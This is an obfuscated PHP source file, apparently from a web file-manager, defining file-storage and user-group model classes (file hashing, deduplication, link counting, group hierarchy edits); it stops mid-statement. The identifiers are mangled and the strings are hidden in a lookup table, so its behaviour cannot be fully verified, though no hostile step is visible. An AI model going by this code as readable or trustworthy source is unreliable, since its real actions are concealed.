<?php
 goto b°‰Àµñ·÷; F÷˜¨¶–„ƒ: class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\x6c\145\x5f\143\157\x6e\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\151\x6d\x65", "\164\151\155\145", "\151\156\163\145\x72\164", "\146\165\x6e\x63\164\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\x6c\145"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\x6d\145" => "\151\157\x5f\x66\x69\154\145\x5f\155\145\x74\x61", "\155\x65\x74\x61\106\x69\145\154\144" => "\146\x69\154\145\111\104"); public function fileInfo($´è‹•‘í) { $ŸèÒùÀ =& $_SERVER[ì…™Î¶Ï]; static $¤ı±ÂÁà = array(); if (!isset($¤ı±ÂÁà[$´è‹•‘í])) { $í‘íâ´â = $ŸèÒùÀ[1847]; $èšùÏ­Ò = Model($ŸèÒùÀ[461])->field($í‘íâ´â)->where(array($ŸèÒùÀ[459] => $´è‹•‘í))->find(); $¤ı±ÂÁà[$´è‹•‘í] = $èšùÏ­Ò; } return $¤ı±ÂÁà[$´è‹•‘í]; } public function addFileByContent($ğæô £ = '', $´Â‘ë“¶ = '') { $Ì®ŠèÕ± =& $_SERVER[ì…™Î¶Ï]; $äÊ·ìı‘ = TEMP_PATH . $Ì®ŠèÕ±[1848]; if (!is_dir($äÊ·ìı‘)) { mk_dir($äÊ·ìı‘); } $¡€ßĞùş = $äÊ·ìı‘ . $Ì®ŠèÕ±[1849] . rand_string(16); file_put_contents($¡€ßĞùş, $ğæô £); $¿ÈğøŞ¨ = $this->addFile($¡€ßĞùş, $´Â‘ë“¶, !0); if (file_exists($¡€ßĞùş)) { @unlink($¡€ßĞùş); } return $¿ÈğøŞ¨; } public function createFileName($ÔÅÃÂ¬£, $Ÿí›óñó = false, $–ùŞÑ×Æ = false) { $éËÚô­Ú =& $_SERVER[ì…™Î¶Ï]; $ ŠíÏµú = IO::init($éËÚô­Ú[8]); $á¨³ö°Ü = $this->makeFilePath($ÔÅÃÂ¬£, $ ŠíÏµú, $Ÿí›óñó, $–ùŞÑ×Æ); $¶¬àÏËª = $ ŠíÏµú->pathFather($á¨³ö°Ü); static $ğ²ø—ÀÈ = false; $’˜Û®‡ = $éËÚô­Ú[1850] . md5($¶¬àÏËª); if (!$ğ²ø—ÀÈ && !Cache::get($’˜Û®‡)) { $ğ²ø—ÀÈ = !0; $Ì€èãÏ³ = IO::mkdir($¶¬àÏËª); if (!IO::exist($Ì€èãÏ³ . $éËÚô­Ú[772])) { IO::mkfile($Ì€èãÏ³ . $éËÚô­Ú[772]); } Cache::set($’˜Û®‡, 1, 3600 * 2); } return $á¨³ö°Ü; } public function makeFilePath($¯ğëÑüñ, $€½µöï¥, $ûƒşàÙ¤ = false, $êş½‚Ñâ = false) { $ù§îãÁ =& $_SERVER[ì…™Î¶Ï]; $½Êâ™é = Model($ù§îãÁ[745])->get($ù§îãÁ[1851]); $Ÿ¥Íì½‚ = KodIO::defaultIO() . date($ù§îãÁ[1852]); $ÌÒ›¦ã = $Ÿ¥Íì½‚ . rand_string(5) . short_id(100); $¯ğëÑüñ = str_replace($ù§îãÁ[8], $ù§îãÁ[11], KodIO::clear($¯ğëÑüñ)); $—ø¦ëâ“ = $€½µöï¥->ext($¯ğëÑüñ); if (!$¯ğëÑüñ) { $½Êâ™é = $ù§îãÁ[1853]; } switch ($½Êâ™é) { case $ù§îãÁ[1854]: $ÌÒ›¦ã = $ÌÒ›¦ã . $ù§îãÁ[10] . $€½µöï¥->ext($¯ğëÑüñ); if ($—ø¦ëâ“ == $ù§îãÁ[1792]) { $ÌÒ›¦ã .= $ù§îãÁ[1527]; } break; case $ù§îãÁ[1855]: $ÌöÒ¨¤ï = Model($ù§îãÁ[745])->get($ù§îãÁ[746]); $ö•›¹Ìã = substr(md5($ù§îãÁ[747] . $ÌöÒ¨¤ï . date($ù§îãÁ[723])), 0, 8); $¢‹ˆÍÈ· = KodIO::defaultDriver(); $Ÿ¥Íì½‚ = $ù§îãÁ[1203] . $¢‹ˆÍÈ·[$ù§îãÁ[392]] . $ù§îãÁ[401] . date($ù§îãÁ[1856]) . $ö•›¹Ìã . $ù§îãÁ[8]; if ($—ø¦ëâ“ == $ù§îãÁ[1792]) { $¯ğëÑüñ .= $ù§îãÁ[1527]; } $±âæşĞâ = $ù§îãÁ[1857] . $Ÿ¥Íì½‚ . $¯ğëÑüñ; CacheLock::lock($±âæşĞâ); $ÌÒ›¦ã = $Ÿ¥Íì½‚ . $¯ğëÑüñ; if (IO::exist($Ÿ¥Íì½‚ . $¯ğëÑüñ)) { $…¯ĞšŞ‡ = substr($¯ğëÑüñ, 0, strlen($¯ğëÑüñ) - strlen($—ø¦ëâ“)); $åÕ€ÀÑÓ = $êş½‚Ñâ ? substr($êş½‚Ñâ, 0, 5) : ($ûƒşàÙ¤ ? substr($ûƒşàÙ¤, 0, 5) : rand_string(5)); $ÌÒ›¦ã = $Ÿ¥Íì½‚ . $…¯ĞšŞ‡ . $åÕ€ÀÑÓ . $ù§îãÁ[10] . $—ø¦ëâ“; } if (IO::isTypeObject($ÌÒ›¦ã) && !IO::isUploadServer($ÌÒ›¦ã)) { if (IO::exist($ÌÒ›¦ã)) { return $ÌÒ›¦ã; } $£‰º—€‰ = IO::setContent($ÌÒ›¦ã, $ù§îãÁ[12]); if (!$£‰º—€‰) { show_json($ù§îãÁ[1858], !1); } } CacheLock::unlock($±âæşĞâ); break; case $ù§îãÁ[1853]: break; default: break; } return $ÌÒ›¦ã; } public function addFileByRemote($İıÄæà, $‹”ÆÒæÆ, $Ö³†åƒ« = array()) { $íâËô½ =& $_SERVER[ì…™Î¶Ï]; if (!IO::exist($İıÄæà)) { return !1; } $õ¨³ó¬ = $Ö³†åƒ«[$íâËô½[169]] ? $Ö³†åƒ«[$íâËô½[169]] : $íâËô½[12]; $˜ıà¥È = IO::hashMd5($İıÄæà, $õ¨³ó¬); $Ùè¹ÌÈš = KodIO::defaultDriver(); $Ò»µ»£î = array($íâËô½[570] => IO::size($İıÄæà), $íâËô½[1859] => 1, $íâËô½[412] => $‹”ÆÒæÆ, $íâËô½[783] => $Ùè¹ÌÈš[$íâËô½[392]], $íâËô½[413] => $İıÄæà, $íâËô½[1860] => $Ö³†åƒ«[$íâËô½[170]] ? $Ö³†åƒ«[$íâËô½[170]] : IO::hashSimple($İıÄæà), $íâËô½[1861] => $˜ıà¥È ? $˜ıà¥È : $õ¨³ó¬); if ($ò±ó†ôÕ = $this->addFileCheckExist($Ò»µ»£î[$íâËô½[170]], $Ò»µ»£î[$íâËô½[169]], $Ò»µ»£î[$íâËô½[80]])) { return $ò±ó†ôÕ; } return $this->addFileData($Ò»µ»£î); } private function addFileData($Ÿ§ùóÌÑ) { $ÕÀÕÛü  =& $_SERVER[ì…™Î¶Ï]; if (!$Ÿ§ùóÌÑ) { return !1; } $Ÿ§ùóÌÑ[$ÕÀÕÛü [80]] = intval($Ÿ§ùóÌÑ[$ÕÀÕÛü [80]]); if (!$Ÿ§ùóÌÑ[$ÕÀÕÛü [80]] && strlen($Ÿ§ùóÌÑ[$ÕÀÕÛü [170]]) > 32) { $Ÿ§ùóÌÑ[$ÕÀÕÛü [80]] = intval(substr($Ÿ§ùóÌÑ[$ÕÀÕÛü [170]], 32)); } $ßŠåíçƒ = $this->add($Ÿ§ùóÌÑ); return $this->find($ßŠåíçƒ); } public function addFile($Ê çÖÁØ, $ÑıĞ¬¦¡, $š¦†—¸ = false) { $´Î§˜ÄÖ =& $_SERVER[ì…™Î¶Ï]; $·í©£§É = IO::hashSimple($Ê çÖÁØ); $Ø¶ÉØˆõ = IO::size($Ê çÖÁØ); $Ú…÷Ç¡ = $Ø¶ÉØˆõ <= 1024 * 1024 * 10 ? IO::hashMd5($Ê çÖÁØ) : $´Î§˜ÄÖ[12]; $œ¶™¼¤ = $´Î§˜ÄÖ[1862] . $·í©£§É; CacheLock::lock($œ¶™¼¤); if ($Ú…÷Ç¡ && $·í©£§É) { $ïâí¤Ç• = $this->addFileCheckExist($·í©£§É, $Ú…÷Ç¡, $Ø¶ÉØˆõ); if ($ïâí¤Ç•) { CacheLock::unlock($œ¶™¼¤); return $ïâí¤Ç•; } } $ƒÉ¬¦à = $this->addFileMake($Ê çÖÁØ, $Ø¶ÉØˆõ, $·í©£§É, $Ú…÷Ç¡, $ÑıĞ¬¦¡, $š¦†—¸); $ª¶ìÌÏÌ = $this->addFileData($ƒÉ¬¦à); CacheLock::unlock($œ¶™¼¤); if (!$Ú…÷Ç¡ && $ª¶ìÌÏÌ) { $this->fileMd5Check($ª¶ìÌÏÌ); } return $ª¶ìÌÏÌ; } private function fileMd5Check($¬»Õ×±Å) { $ÚĞ’¼ş´ =& $_SERVER[ì…™Î¶Ï]; $£ö‘ñí† = array($¬»Õ×±Å[$ÚĞ’¼ş´[458]], $¬»Õ×±Å[$ÚĞ’¼ş´[78]]); $»…æıæ£ = $ÚĞ’¼ş´[1863] . $¬»Õ×±Å[$ÚĞ’¼ş´[78]]; $Ï¬ŠÕ¤¨ = $ÚĞ’¼ş´[1864] . $¬»Õ×±Å[$ÚĞ’¼ş´[458]]; $«Ş¤Àô = TaskQueue::add($ÚĞ’¼ş´[1865], $£ö‘ñí†, $»…æıæ£, $Ï¬ŠÕ¤¨); if (!$«Ş¤Àô) { $this->fileMd5Set($¬»Õ×±Å[$ÚĞ’¼ş´[458]], $¬»Õ×±Å[$ÚĞ’¼ş´[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($»ğüÛûî, $ßßåšï) { $µ‹·ôíÅ =& $_SERVER[ì…™Î¶Ï]; $˜Ÿ±ùí  = $this->find($»ğüÛûî); if (!$˜Ÿ±ùí  || $˜Ÿ±ùí [$µ‹·ôíÅ[169]]) { return; } $÷úÚø² = IO::hashMd5($ßßåšï); if (!$÷úÚø²) { return $µ‹·ôíÅ[12]; } $this->where(array($µ‹·ôíÅ[458] => $»ğüÛûî))->save(array($µ‹·ôíÅ[169] => $÷úÚø²)); } public function addFileMake($Ê™¿­‡, $°Èß²çå, $øÆÌÂÉà, $•öŠïù½, $Ì‘î®î³, $¼ÉÍ«÷«) { $ŸÚŒ¡”’ =& $_SERVER[ì…™Î¶Ï]; $ú™»–Ÿõ = $this->createFileName($Ì‘î®î³, $øÆÌÂÉà, $•öŠïù½); $ìÑº•Ø = get_path_father($ú™»–Ÿõ); $Ù€ÑÍ¸Ó = get_path_this($ú™»–Ÿõ); if ($¼ÉÍ«÷«) { $ãáìŒ = IO::move($Ê™¿­‡, $ìÑº•Ø, !1, $Ù€ÑÍ¸Ó); } else { $ãáìŒ = IO::copy($Ê™¿­‡, $ìÑº•Ø, !1, $Ù€ÑÍ¸Ó); } if (!$ãáìŒ) { return !1; } $§Å±›ÈÊ = KodIO::defaultDriver(); $¶ÆŸó’™ = array($ŸÚŒ¡”’[570] => $°Èß²çå, $ŸÚŒ¡”’[1859] => 1, $ŸÚŒ¡”’[412] => $Ì‘î®î³, $ŸÚŒ¡”’[783] => $§Å±›ÈÊ[$ŸÚŒ¡”’[392]], $ŸÚŒ¡”’[413] => $ú™»–Ÿõ, $ŸÚŒ¡”’[1860] => $øÆÌÂÉà, $ŸÚŒ¡”’[1861] => $•öŠïù½); return $¶ÆŸó’™; } public function addFileCheckExist($¾Ã¤ÅÒÛ, $íò³ÜÅä, $•Š§ğ®å) { $È±ı•„ =& $_SERVER[ì…™Î¶Ï]; $î˜ğ²Ø¬ = $this->findByHash($¾Ã¤ÅÒÛ, $íò³ÜÅä); if (!$î˜ğ²Ø¬) { return !1; } $ªÚèÜ¬ = array($È±ı•„[1859] => intval($î˜ğ²Ø¬[$È±ı•„[1866]]) + 1, $È±ı•„[570] => $•Š§ğ®å); $this->where(array($È±ı•„[459] => $î˜ğ²Ø¬[$È±ı•„[458]]))->save($ªÚèÜ¬); return $î˜ğ²Ø¬; } public function remove($àïÛÏËÏ) { $this->linkCountChange($àïÛÏËÏ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ñîÈŞ²á) { $this->linkCountChange($ñîÈŞ²á, !0); } public function linkCountChange($îÏ–Üô, $Ë¸Ğ»­) { $È²€­ =& $_SERVER[ì…™Î¶Ï]; if (!$îÏ–Üô) { return; } if (!is_array($îÏ–Üô)) { $îÏ–Üô = array($îÏ–Üô); } $“ıç§Â = array(); foreach ($îÏ–Üô as $œ”ğŞ˜) { $·£¸»®œ = $œ”ğŞ˜ . $È²€­[12]; if (!$“ıç§Â[$·£¸»®œ]) { $“ıç§Â[$·£¸»®œ] = 0; } $“ıç§Â[$·£¸»®œ]++; } $­Ê„“Ü = array(); foreach ($“ıç§Â as $œ”ğŞ˜ => $Ôçêæƒ¬) { $·£¸»®œ = $Ôçêæƒ¬ . $È²€­[12]; if (!$­Ê„“Ü[$·£¸»®œ]) { $­Ê„“Ü[$·£¸»®œ] = array(); } $­Ê„“Ü[$·£¸»®œ][] = $œ”ğŞ˜; } foreach ($­Ê„“Ü as $Ôçêæƒ¬ => $˜Ë €ç¤) { if (!$˜Ë €ç¤) { continue; } $Ôçêæƒ¬ = $Ë¸Ğ»­ ? $Ôçêæƒ¬ : -intval($Ôçêæƒ¬); $ÇÅ×®ù‰ = array($È²€­[458] => array($È²€­[7], $˜Ë €ç¤)); if ($Ôçêæƒ¬ < 0) { $ÇÅ×®ù‰[$È²€­[1866]] = array($È²€­[991], abs($Ôçêæƒ¬)); } $this->where($ÇÅ×®ù‰)->setAdd($È²€­[1866], $Ôçêæƒ¬); } } public function findByHash($©šàÃÊŠ, $‡¼§ÌÇ‘ = false) { $ú´¸¾Û =& $_SERVER[ì…™Î¶Ï]; if (!$©šàÃÊŠ && !$‡¼§ÌÇ‘) { return !1; } $•Æ¼şÊã = array($ú´¸¾Û[1860] => $©šàÃÊŠ); if ($‡¼§ÌÇ‘) { $•Æ¼şÊã = array($ú´¸¾Û[1861] => $‡¼§ÌÇ‘); } return $this->order($ú´¸¾Û[1867])->where($•Æ¼şÊã)->find(); } public function clearEmpty($ñ¦Ó¿™ì = 0) { $½®Â±¯ =& $_SERVER[ì…™Î¶Ï]; $€„°Ïîş = time() - 3600 * 24 * $ñ¦Ó¿™ì; $‚íè´áĞ = $½®Â±¯[1868] . $€„°Ïîş; $ˆÔ¨àŠÁ = $this->where($‚íè´áĞ)->select(); if (!$ˆÔ¨àŠÁ) { return; } $…„Õ“š = new Task($½®Â±¯[1869], $½®Â±¯[12], count($ˆÔ¨àŠÁ)); foreach ($ˆÔ¨àŠÁ as $Øñ…´ÕÅ) { $…„Õ“š->update(1); $this->resetFile($Øñ…´ÕÅ); } $…„Õ“š->end(); } public function resetFile($¦ğºş‘) { $‚˜æëş÷ =& $_SERVER[ì…™Î¶Ï]; $»¥´ÉÎç = array($‚˜æëş÷[459] => $¦ğºş‘[$‚˜æëş÷[458]]); $ëçŸ‚º¢ = Model($‚˜æëş÷[1301])->where($»¥´ÉÎç)->count(); $Íİ´å”§ = Model($‚˜æëş÷[1870])->where($»¥´ÉÎç)->count(); $Ÿ‹Ìãñ‡ = intval($ëçŸ‚º¢) + intval($Íİ´å”§); if ($Ÿ‹Ìãñ‡ == 0) { IO::remove($¦ğºş‘[$‚˜æëş÷[78]]); Model($‚˜æëş÷[1871])->delete($¦ğºş‘[$‚˜æëş÷[458]]); $this->where($»¥´ÉÎç)->delete(); $this->metaSet($¦ğºş‘[$‚˜æëş÷[458]], null, null); return; } if ($¦ğºş‘[$‚˜æëş÷[1866]] != $Ÿ‹Ìãñ‡) { $this->where($»¥´ÉÎç)->save(array($‚˜æëş÷[1859] => $Ÿ‹Ìãñ‡)); } } public function storageInfo($¤ôÂËøÛ = false) { $ºãÄ¡çÆ =& $_SERVER[ì…™Î¶Ï]; $ş™ÏÊãˆ = $this->count() + 0.0; $ìÊõıøá = 0; $»Ì›¦Ø• = 1; $’ŠÙŞ¨¹ = 0; $—›Ó‚×Æ = 5000; for ($æÈï›ğ¯ = 0; $æÈï›ğ¯ < $ş™ÏÊãˆ; $æÈï›ğ¯ = $æÈï›ğ¯ + $—›Ó‚×Æ) { $œ‡ªÉá = $this->limit($æÈï›ğ¯, $æÈï›ğ¯ + $—›Ó‚×Æ)->select(); foreach ($œ‡ªÉá as $³¹–®òÉ) { $»Ì›¦Ø• += $³¹–®òÉ[$ºãÄ¡çÆ[80]] * $³¹–®òÉ[$ºãÄ¡çÆ[1866]]; $ìÊõıøá += $³¹–®òÉ[$ºãÄ¡çÆ[80]] * ($³¹–®òÉ[$ºãÄ¡çÆ[1866]] - 1); $’ŠÙŞ¨¹ += $³¹–®òÉ[$ºãÄ¡çÆ[1866]]; } } $ŒÖë¬¢ = array($ºãÄ¡çÆ[1872] => $»Ì›¦Ø•, $ºãÄ¡çÆ[1873] => $ìÊõıøá, $ºãÄ¡çÆ[1874] => $ìÊõıøá / $»Ì›¦Ø•, $ºãÄ¡çÆ[84] => $ş™ÏÊãˆ, $ºãÄ¡çÆ[1875] => $’ŠÙŞ¨¹); return $ŒÖë¬¢; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\155\x65" => "\x67\162\x6f\x75\160\x5f\x6d\x65\164\141", "\155\145\x74\141\x46\151\145\154\144" => "\x67\x72\157\165\160\x49\104"); protected function cacheFunctionAlias($Üù×«ùõ) { $íÄ²…ñª =& $_SERVER[ì…™Î¶Ï]; return array($íÄ²…ñª[1876] => array($Üù×«ùõ[0], $íÄ²…ñª[1877]), $íÄ²…ñª[1878] => array($Üù×«ùõ[0], $íÄ²…ñª[1879])); } protected function getInfo($£©Ì° , $²¤™€¶º = false) { $ˆ¼©¡‡¹ = $this->getInfoSimple($£©Ì° ); if (!$ˆ¼©¡‡¹) { return !1; } if ($²¤™€¶º) { return $this->_listDataApplyItem($ˆ¼©¡‡¹); } return $this->cacheFunctionGet($_SERVER[ì…™Î¶Ï][1880], $£©Ì° ); } protected function getInfoSimple($Î‘íù­É, $ÌÁªÁ­À = false) { $ıØßßÈ =& $_SERVER[ì…™Î¶Ï]; if ($ÌÁªÁ­À) { $‹Â¯”× = array($ıØßßÈ[1799] => intval($Î‘íù­É)); $ÄøşŸé  = $this->where($‹Â¯”×)->find(); return is_array($ÄøşŸé ) ? $ÄøşŸé  : array(); } return $this->cacheFunctionGet($ıØßßÈ[1881], $Î‘íù­É); } protected function groupAdd($Ü“å›ù) { $®¤ƒäæ =& $_SERVER[ì…™Î¶Ï]; if (!$Ü“å›ù[$®¤ƒäæ[489]] && isset($Ü“å›ù[$®¤ƒäæ[1799]]) && $Ü“å›ù[$®¤ƒäæ[1799]] == 1) { if ($ €Òµ¸ = $this->getInfoSimple($Ü“å›ù[$®¤ƒäæ[1799]], !0)) { return $Ü“å›ù[$®¤ƒäæ[1799]]; } } else { $ €Òµ¸ = $this->getInfoSimple($Ü“å›ù[$®¤ƒäæ[489]]); if (!$ €Òµ¸) { return !1; } } $­ãŠ‹îÊ = $®¤ƒäæ[522]; if ($ €Òµ¸[$®¤ƒäæ[512]]) { $­ãŠ‹îÊ = $ €Òµ¸[$®¤ƒäæ[512]] . $ €Òµ¸[$®¤ƒäæ[1799]] . $®¤ƒäæ[50]; } $”ºæ«‚ = array($®¤ƒäæ[412] => $this->groupNameAuto($Ü“å›ù[$®¤ƒäæ[489]], $Ü“å›ù[$®¤ƒäæ[32]]), $®¤ƒäæ[393] => $Ü“å›ù[$®¤ƒäæ[489]], $®¤ƒäæ[575] => $­ãŠ‹îÊ, $®¤ƒäæ[1882] => $Ü“å›ù[$®¤ƒäæ[1786]], $®¤ƒäæ[1883] => 0, $®¤ƒäæ[1803] => 0); if (isset($Ü“å›ù[$®¤ƒäæ[1822]])) { $”ºæ«‚[$®¤ƒäæ[1822]] = $Ü“å›ù[$®¤ƒäæ[1822]]; } else { $º˜¨¦óœ = $this->max($®¤ƒäæ[1822]); if (!$º˜¨¦óœ) { $º˜¨¦óœ = 0; } $”ºæ«‚[$®¤ƒäæ[1822]] = $º˜¨¦óœ + 1; } if (!empty($Ü“å›ù[$®¤ƒäæ[1799]])) { $”ºæ«‚[$®¤ƒäæ[1799]] = $Ü“å›ù[$®¤ƒäæ[1799]]; } $Œ“Ø­¹ª = $this->add($”ºæ«‚); $this->setNamePinyin($Œ“Ø­¹ª, $”ºæ«‚[$®¤ƒäæ[32]]); if (isset($Ü“å›ù[$®¤ƒäæ[1884]])) { $this->metaSet($Œ“Ø­¹ª, array($®¤ƒäæ[1884] => $Ü“å›ù[$®¤ƒäæ[1884]], $®¤ƒäæ[1885] => $Ü“å›ù[$®¤ƒäæ[1885]])); unset($Ü“å›ù[$®¤ƒäæ[1884]]); unset($Ü“å›ù[$®¤ƒäæ[1885]]); } Model($®¤ƒäæ[1301])->groupRootAdd($Œ“Ø­¹ª); return $Œ“Ø­¹ª; } protected function groupEdit($Èüİïáğ, $Ç…õ–š÷) { $ï»ı¡ˆ =& $_SERVER[ì…™Î¶Ï]; $ìÉêŸ® = $this->getInfoSimple($Èüİïáğ); if (!$ìÉêŸ®) { return !1; } if (!empty($Ç…õ–š÷[$ï»ı¡ˆ[489]])) { $òçå§… = $this->getInfoSimple($Ç…õ–š÷[$ï»ı¡ˆ[489]]); if (!$òçå§…) { return !1; } if ($ìÉêŸ®[$ï»ı¡ˆ[1799]] == $òçå§…[$ï»ı¡ˆ[1799]]) { return !1; } if ($Ç…õ–š÷[$ï»ı¡ˆ[489]] != $ìÉêŸ®[$ï»ı¡ˆ[489]]) { if ($òçå§…[$ï»ı¡ˆ[512]] !== $ìÉêŸ®[$ï»ı¡ˆ[512]] && strpos($òçå§…[$ï»ı¡ˆ[512]], $ìÉêŸ®[$ï»ı¡ˆ[512]] . $ìÉêŸ®[$ï»ı¡ˆ[1799]] . $ï»ı¡ˆ[50]) === 0) { return !1; } $Ç…õ–š÷[$ï»ı¡ˆ[575]] = $òçå§…[$ï»ı¡ˆ[512]] . $Ç…õ–š÷[$ï»ı¡ˆ[489]] . $ï»ı¡ˆ[50]; $this->_changeChildLevel($ìÉêŸ®, $òçå§…); } } if (isset($Ç…õ–š÷[$ï»ı¡ˆ[32]])) { $this->setNamePinyin($Èüİïáğ, $Ç…õ–š÷[$ï»ı¡ˆ[32]]); } if (isset($Ç…õ–š÷[$ï»ı¡ˆ[1884]])) { $this->metaSet($Èüİïáğ, array($ï»ı¡ˆ[1884] => $Ç…õ–š÷[$ï»ı¡ˆ[1884]], $ï»ı¡ˆ[1885] => $Ç…õ–š÷[$ï»ı¡ˆ[1885]])); unset($Ç…õ–š÷[$ï»ı¡ˆ[1884]]); unset($Ç…õ–š÷[$ï»ı¡ˆ[1885]]); } $this->_clearChildrenCache($ìÉêŸ®); return $this->where(array($ï»ı¡ˆ[1886] => $Èüİïáğ))->save($Ç…õ–š÷); } private function _clearChildrenCache($‹´‹ùèË) { $¯ÌÕØ¬Ô =& $_SERVER[ì…™Î¶Ï]; $¥ÕÖÜ™ê = array($¯ÌÕØ¬Ô[575] => array($¯ÌÕØ¬Ô[535], $‹´‹ùèË[$¯ÌÕØ¬Ô[512]] . $‹´‹ùèË[$¯ÌÕØ¬Ô[1799]] . $¯ÌÕØ¬Ô[536])); $îœŒêË“ = $this->field($¯ÌÕØ¬Ô[1799])->where($¥ÕÖÜ™ê)->select(); foreach ($îœŒêË“ as $»›éß’¢) { $this->_clearCache($»›éß’¢[$¯ÌÕØ¬Ô[1799]]); } } private function _clearCache($à¿ƒ½Îõ) { $¬ªú¾ğ˜ =& $_SERVER[ì…™Î¶Ï]; $this->cacheFunctionClear($¬ªú¾ğ˜[1880], $à¿ƒ½Îõ); $this->cacheFunctionClear($¬ªú¾ğ˜[1881], $à¿ƒ½Îõ); } private function _changeChildLevel($½Ø£ğù, $Å™“, $ÛÉ§ª¤É = false) { $·’•éÌÜ =& $_SERVER[ì…™Î¶Ï]; $”•¢ƒé = $½Ø£ğù[$·’•éÌÜ[512]] . $½Ø£ğù[$·’•éÌÜ[1799]] . $·’•éÌÜ[50]; $‚ëœŸß = $Å™“[$·’•éÌÜ[512]] . $Å™“[$·’•éÌÜ[1799]] . $·’•éÌÜ[50] . $½Ø£ğù[$·’•éÌÜ[1799]] . $·’•éÌÜ[50]; if ($ÛÉ§ª¤É) { $‚ëœŸß = $Å™“[$·’•éÌÜ[512]] . $Å™“[$·’•éÌÜ[1799]] . $·’•éÌÜ[50]; } $ú¥²¾İ¹ = array($·’•éÌÜ[575] => array($·’•éÌÜ[535], $½Ø£ğù[$·’•éÌÜ[512]] . $½Ø£ğù[$·’•éÌÜ[1799]] . $·’•éÌÜ[536])); $ğÙ®Óã‡ = array($·’•éÌÜ[575] => array($·’•éÌÜ[584], "\162\x65\160\154\141\143\x65\50\160\141\162\145\156\x74\114\x65\x76\145\154\54\x27{$”•¢ƒé}\47\x2c\47{$‚ëœŸß}\47\x29")); $this->_clearChildrenCache($½Ø£ğù); $this->where($ú¥²¾İ¹)->data($ğÙ®Óã‡)->save(); } public function setNamePinyin($‰Ïˆ‰ä¬, $äß»±Ëò = false) { $æÅŠ×Ù¦ =& $_SERVER[ì…™Î¶Ï]; if (!$äß»±Ëò) { $‰ØÍÜÑŸ = $this->getInfoSimple($‰Ïˆ‰ä¬); $äß»±Ëò = $‰ØÍÜÑŸ[$æÅŠ×Ù¦[32]]; } if (!Input::check($äß»±Ëò, $æÅŠ×Ù¦[578])) { $this->metaSet($‰Ïˆ‰ä¬, $æÅŠ×Ù¦[455], null); $this->metaSet($‰Ïˆ‰ä¬, $æÅŠ×Ù¦[454], null); return; } $öãÎòÁ = array($æÅŠ×Ù¦[455] => str_replace($æÅŠ×Ù¦[53], $æÅŠ×Ù¦[12], Pinyin::get($äß»±Ëò)), $æÅŠ×Ù¦[454] => Pinyin::get($äß»±Ëò, $æÅŠ×Ù¦[579])); $this->metaSet($‰Ïˆ‰ä¬, $öãÎòÁ); } protected function groupStatus($Êœ¥“ŠÁ, $¿»£Êô) { $©ÔèŸ© =& $_SERVER[ì…™Î¶Ï]; $éúşÒç = $this->getInfoSimple($Êœ¥“ŠÁ); if (!$éúşÒç) { return !1; } if ($¿»£Êô == $©ÔèŸ©[89]) { $‹öš”Ë­ = $this->parentLevelArray($éúşÒç[$©ÔèŸ©[512]]); } else { $øÍíôîô = array($©ÔèŸ©[575] => array($©ÔèŸ©[535], $éúşÒç[$©ÔèŸ©[512]] . $éúşÒç[$©ÔèŸ©[1799]] . $©ÔèŸ©[536])); $‹öš”Ë­ = $this->where($øÍíôîô)->field($©ÔèŸ©[1799])->select(); $‹öš”Ë­ = array_to_keyvalue($‹öš”Ë­, $©ÔèŸ©[12], $©ÔèŸ©[1799]); } $‹öš”Ë­[] = $éúşÒç[$©ÔèŸ©[1799]]; $ó€¢ƒõ‘ = array(); foreach ($‹öš”Ë­ as $Êœ¥“ŠÁ) { $ó€¢ƒõ‘[] = array($©ÔèŸ©[1799] => $Êœ¥“ŠÁ, $©ÔèŸ©[95] => $©ÔèŸ©[725], $©ÔèŸ©[369] => $¿»£Êô); $this->_clearCache($Êœ¥“ŠÁ); } return Model($©ÔèŸ©[1887])->addAll($ó€¢ƒõ‘, array(), !0); } protected function groupRemove($ãêÊ÷¿) { $š‘Æ¥îÇ =& $_SERVER[ì…™Î¶Ï]; $æ¯ŞÖ‘ = array($š‘Æ¥îÇ[1799] => $ãêÊ÷¿); $Õ¹¤™¡é = $this->where($æ¯ŞÖ‘)->find(); if (!$Õ¹¤™¡é || $Õ¹¤™¡é[$š‘Æ¥îÇ[489]] == 0) { return !1; } $íîÎ™µ¢ = $this->getInfoSimple($Õ¹¤™¡é[$š‘Æ¥îÇ[489]]); $this->_changeChildLevel($Õ¹¤™¡é, $íîÎ™µ¢, !0); $this->where(array($š‘Æ¥îÇ[489] => $ãêÊ÷¿))->save(array($š‘Æ¥îÇ[489] => $Õ¹¤™¡é[$š‘Æ¥îÇ[489]])); Model($š‘Æ¥îÇ[1887])->where($æ¯ŞÖ‘)->delete(); Model($š‘Æ¥îÇ[1888])->where($æ¯ŞÖ‘)->delete(); Model($š‘Æ¥îÇ[800])->groupRootRemove($ãêÊ÷¿); return $this->where($æ¯ŞÖ‘)->delete(); } protected function groupSort($²‡‚®Ï) { $çÀ£—° =& $_SERVER[ì…™Î¶Ï]; $Ä‹ÜŞÈ = array(); foreach ($²‡‚®Ï as $¯õÙÂ‘Ç => $ĞÍ¼´ˆ¬) { $Ä‹ÜŞÈ[] = array($çÀ£—°[1799], $ĞÍ¼´ˆ¬, $çÀ£—°[1822], $¯õÙÂ‘Ç + 1); } $this->saveAll($Ä‹ÜŞÈ); } public function listData() { $Õ½ó° = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Õ½ó°[$_SERVER[ì…™Î¶Ï][364]]); return $Õ½ó°; } private function _makeOrder($Ğä˜ª‚” = '') { $¹ãäıˆğ =& $_SERVER[ì…™Î¶Ï]; $‹Ó½­ÙÚ = array($¹ãäıˆğ[1799], $¹ãäıˆğ[32], $¹ãäıˆğ[1788], $¹ãäıˆğ[193]); $´ÖÜèÅÇ = array($¹ãäıˆğ[439] => $¹ãäıˆğ[440], $¹ãäıˆğ[441] => $¹ãäıˆğ[442]); $»‘ù›š© = Input::get($¹ãäıˆğ[446], $¹ãäıˆğ[7], $¹ãäıˆğ[1803], $‹Ó½­ÙÚ); $ñÁÎæ—ã = Input::get($¹ãäıˆğ[447], $¹ãäıˆğ[7], $¹ãäıˆğ[1889], array($¹ãäıˆğ[1889], $¹ãäıˆğ[441])); $ñÁÎæ—ã = 